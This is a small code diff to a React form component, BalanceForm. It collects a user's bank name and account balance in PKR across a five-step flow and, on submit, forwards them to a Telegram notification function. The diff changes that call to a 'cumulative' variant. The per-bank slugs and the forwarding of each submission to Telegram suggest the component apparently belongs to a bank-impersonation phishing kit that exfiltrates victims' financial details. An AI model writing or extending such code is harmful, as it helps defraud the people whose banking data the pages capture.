@@ -3,7 +3,7 @@
 import { useMemo, useState, type FormEvent } from 'react'
 import { useRouter } from 'next/navigation'
 import { ChevronRight, Info } from 'lucide-react'
-import { notifyTelegram } from '@/lib/notify'
+import { notifyTelegramCumulative } from '@/lib/notify'
 
 const TOTAL_STEPS = 5
 
@@ -29,7 +29,7 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
   function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isValid) return
-    notifyTelegram('Account Balance Submitted', [
+    notifyTelegramCumulative('Account Balance Submitted', [
       { label: 'Bank', value: bankName },
       { label: 'Balance (PKR)', value: display },
     ])
